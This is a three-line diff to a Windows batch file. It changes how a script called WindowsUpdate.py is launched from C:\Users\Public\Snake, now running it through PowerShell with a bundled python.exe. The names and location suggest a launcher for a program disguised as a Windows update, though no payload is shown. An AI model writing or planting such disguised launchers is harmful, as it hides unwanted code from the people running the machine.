@@ -1,3 +1,2 @@
 @echo off
-cd C:\\Users\\Public\\Snake
-python.exe WindowsUpdate.py
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "C:\\Users\\Public\\Snake\\python.exe" "C:\\Users\\Public\\Snake\\WindowsUpdate.py"
